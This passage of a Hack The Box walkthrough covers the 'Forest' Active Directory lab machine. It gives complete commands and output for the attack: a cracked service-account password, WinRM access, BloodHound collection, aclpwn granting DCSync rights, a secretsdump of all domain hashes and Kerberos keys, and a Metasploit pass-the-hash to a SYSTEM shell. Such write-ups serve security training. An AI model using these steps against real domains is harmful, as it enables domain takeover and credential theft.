Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
```

We have **svc-alfresco:s3rvice** credential pair. Let's test it and its permissions to SMB and at the same time see if these credentials are valid while enumerating what it has access to (I could've used *smbmap* too).


### SMBCLIENT
```
root@kali:~/Documents/HTB-Labs/Forest# smbclient -L //forest.htb/ -U 'HTB\svc-alfresco'
Enter HTB\svc-alfresco's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
root@kali:~/Documents/HTB-Labs/Forest# smbclient //forest.htb/C$ -U 'HTB\svc-alfresco'
Enter HTB\svc-alfresco's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Looks like I can enumerate shares but I do not have permissions to C$ Share through SMB. Let's try to test credentials/gain access through WinRM. To do this, you need to have [evil-winrm](https://github.com/Hackplayers/evil-winrm) installed. Worth going through its documentation as it is one of many other tools that are very versatile.


### EVIL-WINRM
```
root@kali:~/Documents/HTB-Labs/Forest# evil-winrm -i forest.htb -u svc-alfresco -p 's3rvice' -s ./ps1_scripts/ -e ./exe_files/

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
-ar---        9/23/2019   2:16 PM             32 user.txt                                                                                                                                                                                                


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
e5e4e**********************0d9ed
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> 
```

**AND we found the USER flag using svc-alfresco which resided in the account's Desktop directory.**



## Privilege Escalation

We need to get a deeper understanding of this AD environment and the accounts rights. There is a vulnerability in Exchange environments and two groups that would allow some accesses that should not happen, like account modification, and to escalate privileges, accounts in these groups would only need DCSync permissions, quite possible to do. Explained further in Resource #6.

This information can be also found through LDAP and/or by using [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump): EXCHANGE TRUSTED SUBSYSTEM and EXCHANGE WINDOWS PERMISSIONS.

Let's use [Bloodhound/Sharphound](https://github.com/BloodHoundAD/BloodHound) through our current session in evil-winrm.

NOTE: To do this, you must first have Bloodhound setup and configured, a walkthrough by itself that I will skip. Also, pay close attention to the syntax when using Sharphound powershell script.


### SHARPHOUND
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> upload ./ps1_scripts/SharpHound.ps1
Info: Uploading ./ps1_scripts/SharpHound.ps1 to C:\Users\svc-alfresco\Downloads\SharpHound.ps1

Data: 1226060 bytes of 1226060 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> import-module .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> Invoke-BloodHound -Domain HTB -LDAPUser svc-alfresco -LDAPPass s3rvice -CollectionMethod All -ZipFileName test.zip
*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> ls


    Directory: C:\Users\svc-alfresco\Downloads


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
-a----         1/9/2020   8:31 PM           8978 Rk9SRVNU.bin                                                                                                                                                                                            
-a----         1/9/2020   8:23 PM         919546 SharpHound.ps1                                                                                                                                                                                          
-a----         1/9/2020   8:31 PM          12921 test.zip                                                                                                                                                                                                


*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> download test.zip
Info: Downloading C:\Users\svc-alfresco\Downloads\test.zip to test.zip

Info: Download successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> exit
```

This zip file needs to be uploaded into a clean Bloodhound database. After importing it and evaluating the paths for our own understanding of what we will see next, we can use [aclpwn](https://github.com/fox-it/aclpwn.py) and see if it finds a permissions/membership path using svc-alfresco to see how it can achieve DomainAdmin-like permissions or DCSync.

Once you upload the zip file containing all the domain related information, the following is what you should see:

1) If you pulled all the AD information you should see similar numbers. To me, I wanted everything I could read!

![Forest Stats in Bloodhound](/images/Forest_Bloodhound1.png)

2) Not necessary to go through all the queries as the important ones to analyze are 'Find Shortest Paths to Domain Admins' and 'Find Principals with DCSync Rights.

![Forest Stats in Bloodhound](/images/Forest_Bloodhound2.png)

3) BUT the one you actually need is 'Find Shortest Paths to Domain Admins' as it explains why the following tool finds what it does. Basically, because of the group membership of svc-alfresco, you can delegate DCSync rights by modifying the DACL. I will explain soon.

![Forest Stats in Bloodhound](/images/Forest_Bloodhound3.png)


### ACLPWN
```
root@kali:~/Documents/HTB-Labs/Forest# aclpwn -f svc-alfresco -ft User -t htb.local -tt domain -d htb.local -s forest.htb -du neo4j -dp <neo4j_db_passwd>
Please supply the password or LM:NTLM hashes of the account you are escalating from: <svc-alfresco passwd>
[!] Unsupported operation: GetChanges on HTB.LOCAL (Domain)
[-] Invalid path, skipping
[!] Unsupported operation: GenericAll on EXCH01.HTB.LOCAL (Computer)
[-] Invalid path, skipping
[+] Path found!
Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
[+] Path found!
Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
Please choose a path [0-1] 0
[-] Memberof -> continue
[-] Memberof -> continue
[-] Memberof -> continue
[-] Adding user SVC-ALFRESCO to group EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL
[+] Added CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local as member to CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
[-] Re-binding to LDAP to refresh group memberships of SVC-ALFRESCO@HTB.LOCAL
[+] Re-bind successful
[-] Memberof -> continue
[-] Modifying domain DACL to give DCSync rights to SVC-ALFRESCO
[+] Dacl modification successful
[+] Finished running tasks
[+] Saved restore state to aclpwn-20200104-223425.restore
```

Important paths to flag from what aclpwn found (can be also seen by reviewing Sharphound's data in Bloodhound):
1. Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)

2. Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)

I selected PATH 0, but as you can notice by examining each path, there is not much of a difference; path 0 is somewhat longer as relies on being a member of EXCHANGE TRUSTED SUBSYSTEM, and the good one is EXCHANGE WINDOWS PERMISSIONS, BUT the first is a member of EXCHANGE WINDOWS PERMISSIONS anyways.

Technically speaking, we used the permissions svc-alfresco already has to modify accounts by being an "indirect" member of EXCHANGE TRUSTED SUBSYSTEM and EXCHANGE WINDOWS PERMISSIONS to delegate rights to itself by modifying domain DACL and give DCSync rights to itself. I know, it sounds confusing to explain!! At least the last Bloodhound screenshot shows this better.

As we select a path and it was successful, we have to move fast and try to use it to dump secrets (NTDS.DIT). Let's use Impacket's Secretdump


### SECRETSDUMP
```
root@kali:~/Documents/HTB-Labs/Forest# /opt/impacket/examples/secretsdump.py -dc-ip forest.htb svc-alfresco:s3rvice@forest.htb
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:1054eeeb8e0d8d155855d271d112b1c9:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
FOREST$:aes256-cts-hmac-sha1-96:45672c78eaae16282c5aa6cf8ef33327690c738735559035b27fed4e9b517ce4
FOREST$:aes128-cts-hmac-sha1-96:63108bf68ff4221935d0be3aaf18d40a
FOREST$:des-cbc-md5:4cdf16463e7ff7dc
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up... 
```
As we dumped "all secrets" available, notice a great one we need to use:

**htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::**

First thought of some people would be to try and crack this, but how about using it as is? There are different ways, one being through Metasploit's psexec and through one of the Impacket's SMB or Psexec scripts; I went for Metasploit. In escence, both will be doing a **Pass-the-Hash** attack.

To do this, we only need the following portion of the Administrator dump used as password:
**aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6**


### METASPLOIT
```
root@kali:~/Documents/HTB-Labs/Forest# msfconsole
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


       =[ metasploit v5.0.72-dev                          ]
+ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > 
```

#### Using the Exploit 'exploit/windows/smb/psexec' and the Payload 'windows/meterpreter/bind_tcp'
```
msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > set SMBDomain htb.local
SMBDomain => htb.local
msf5 exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf5 exploit(windows/smb/psexec) > set LPORT 4464
LPORT => 4464
msf5 exploit(windows/smb/psexec) > set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD => windows/meterpreter/bind_tcp
msf5 exploit(windows/smb/psexec) > set RPORT 445
RPORT => 445
msf5 exploit(windows/smb/psexec) > set DB_ALL_CREDS false
DB_ALL_CREDS => false
msf5 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
SMBPass => aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
msf5 exploit(windows/smb/psexec) > set RHOST 10.10.10.161
RHOST => 10.10.10.161
msf5 exploit(windows/smb/psexec) > exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
[*] 10.10.10.161:445 - Connecting to the server...
[*] 10.10.10.161:445 - Authenticating to 10.10.10.161:445|htb.local as user 'Administrator'...
[*] 10.10.10.161:445 - Selecting PowerShell target
[*] 10.10.10.161:445 - Executing the payload...
[+] 10.10.10.161:445 - Service start timed out, OK if running a command or non-service executable...
[*] Started bind TCP handler against 10.10.10.161:4464
[*] Sending stage (180291 bytes) to 10.10.10.161
[*] Meterpreter session 1 opened (10.10.14.40:19905 -> 10.10.10.161:4464) at 2020-01-09 23:41:31 -0500
```

Notice the System and User information provided by Meterpreter. After that, let's switch to a "shell" to interactive with the system through Command-Prompt.
```
msf5 > sessions 1
meterpreter > sysinfo
Computer        : FOREST
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > shell
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd c:\Users\Administrator\Desktop

c:\Users\Administrator\Desktop> type root.txt
f0481**********************129cc
```
***Game Over: System Rooted and ROOT Flag found!***

Something important to mention here is, there are other "commands" in Meterpreter to fully own the system even when you  already accessed it as the NT AUTHORITY\SYSTEM, but I am not mentioning them here as the intent is to find the Root Flag. Obviously, I'm limiting the effort to the scope of this exercise; ***find the USER and ROOT flags***!

If you enjoyed my Walkthrough, thought it was useful AND if you are a member of Hack The Box, feel free throw a 'Respect'. Thanks!
